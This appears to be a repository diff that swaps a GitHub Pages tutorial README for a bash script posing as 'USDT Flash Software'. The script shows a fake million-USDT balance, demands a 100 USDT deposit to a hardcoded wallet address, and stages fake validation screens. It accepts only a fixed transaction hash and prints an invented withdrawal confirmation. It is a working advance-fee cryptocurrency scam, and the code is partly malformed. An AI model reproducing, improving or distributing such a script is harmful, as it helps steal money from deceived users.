@@ -1,48 +1,119 @@
-# GitHub Pages
+# !/bin/bash
 
-_Create a site or blog from your GitHub repositories with GitHub Pages._
+# Wallet Command Line
 
-## Welcome
+## balance=1000000
+hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099
+account_id="T9zQPZ16AWGsjmwa6bXGiTSxXVJMzxTT3a"
 
-- **Who is this for**: Beginners, students, project maintainers, small businesses.
-- **What you'll learn**: How to build a GitHub Pages site.
-- **What you'll build**: We'll build a simple GitHub Pages site with a blog. We'll use [Jekyll](https://jekyllrb.com), a static site generator.
-- **Prerequisites**: If you need to learn about branches, commits, and pull requests, take [Introduction to GitHub](https://github.com/skills/introduction-to-github) first.
+usdt_logo="
+\𝕖[38;2;38;161;123𝕞$$$$$$\
+$$  __$$\
+$$ /  \__| $$$$$$\  $$\   $$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\
+\e[38;2;38;161;123m\$$$$$$\  $$  __$$\ $$ |  $$ |$$  _$$  _$$\  \____$$\ $$  __$$\ $$  __$$\
+ \____$$\ $$ /  $$ |$$ |  $$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |
+$$\   $$ |$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |
+\e[38;2;38;161;123m\$$$$$$  |\$$$$$$  |\$$$$$$  |$$ | $$ | $$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |
+ \______/  \______/  \______/ \__| \__| \__| \_______| \______/ \__|  \__|
+\e[0m"
+function fancyBoxEcho {
+    local message="$1"
+    local length=${#message}
+    local border=$(printf '=%.0s' $(seq 1 $((length + 4))))
 
-- **How long**: This exercise takes less than one hour to complete.
+    echo -e "\e[38;2;38;161;123m$border\e[0m"
+    echo -e "\e[38;2;38;161;123m| $message |\e[0m"
+    echo -e "\e[38;2;38;161;123m$border\e[0m"
+}
 
-In this exercise, you will:
+welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"
 
-1. Enable GitHub Pages
-1. Configure your site
-1. Customize your home page
-1. Create a blog post
-1. Merge your pull request
+echo -e "$usdt_logo"
 
+fancyBoxEcho "$welcome_message"
 
-### How to start this exercise
+echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
 
-Simply copy the exercise to your account, then give your favorite Octocat (Mona) **about 20 seconds** to prepare the first lesson, then **refresh the page**.
+function unlockBalance {
+    echo " "
+    read -p "Enter your deposit amount in USDT: " depositAmount
+    read -p "Enter the transaction hash ID: " transactionHash
+	
+    echo " "
+    for ((i=1; i<=15; i++)); do
+        echo -e " \e[32mValidating please wait...\e[0m"
+        sleep 0.5
+    done
+    echo " "
 
-[![](https://img.shields.io/badge/Copy%20Exercise-%E2%86%92-1f883d?style=for-the-badge&logo=github&labelColor=197935)](https://github.com/new?template_owner=skills&template_name=github-pages&owner=%40me&name=skills-github-pages&description=Exercise:+Create+a+site+or+blog+from+your+GitHub+repositories+with+GitHub+Pages&visibility=public)
+    if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
+        refresh
+        selectNetwork
+    else
+        echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
+        sleep 3
+        clear
+        fancyBoxEcho "$welcome_message"
+        unlockBalance
+    fi
+}
 
-<details>
-<summary>Having trouble? 🤷</summary><br/>
+function selectNetwork {
+#    echo -e "$usdt_logo"
+    echo "Select network:"
+    echo " "
+    echo "1. TRC20"
+    echo "2. ERC20"
+    echo "3. BEP20"
+    echo " "
+    echo -n "Enter your choice: "
+    read network_choice
 
-When copying the exercise, we recommend the following settings:
+    case $network_choice in
+        1) network="TRC20";;
+        2) network="ERC20";;
+        3) network="BEP20";;
+        *) echo "Invalid choice, please try again."; selectNetwork;;
+    esac
 
-- For owner, choose your personal account or an organization to host the repository.
+    selectWithdrawalAmount
+function selectWithdrawalAmount {
+    echo "Select withdrawal amount:"
+    echo "1. 1000000"
+    echo "2. 500000"
+    echo "3. 300000"
+    echo "4. 100000"
+    echo -n "Enter your choice: "
+    read amount_choice
 
-- We recommend creating a public repository, since private repositories will use Actions minutes.
+    case $amount_choice in
+        1) amount=1000000;;
+        2) amount=500000;;
+        3) amount=300000;;
+        4) amount=100000;;
+        *) echo "Invalid choice, please try again."; selectWithdrawalAmount;;
+    esac
 
-If the exercise isn't ready in 20 seconds, please check the [Actions](../../actions) tab.
+    read -p "Enter your withdrawal address: " withdrawal_address
+    echo ""
+    echo "Please Wait...."
+    sleep 4
+    echo "[+] Withdrawal of $amount USDT successful to address $withdrawal_address on $network network. [+]"
+    exit
+}
 
-- Check to see if a job is running. Sometimes it simply takes a bit longer.
+function refresh {
+    echo "Refreshing..."
+    sleep 2
+		clear
+    echo -e "$usdt_logo"
+    echo " "
+    fancyBoxEcho "$welcome_message"
+    echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
+}
 
-- If the page shows a failed job, please submit an issue. Nice, you found a bug! 🐛
+refresh # Call the refresh function when the script starts
 
-</details>
-
----
-
-&copy; 2025 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+while true; do
+    unlockBalance
+done
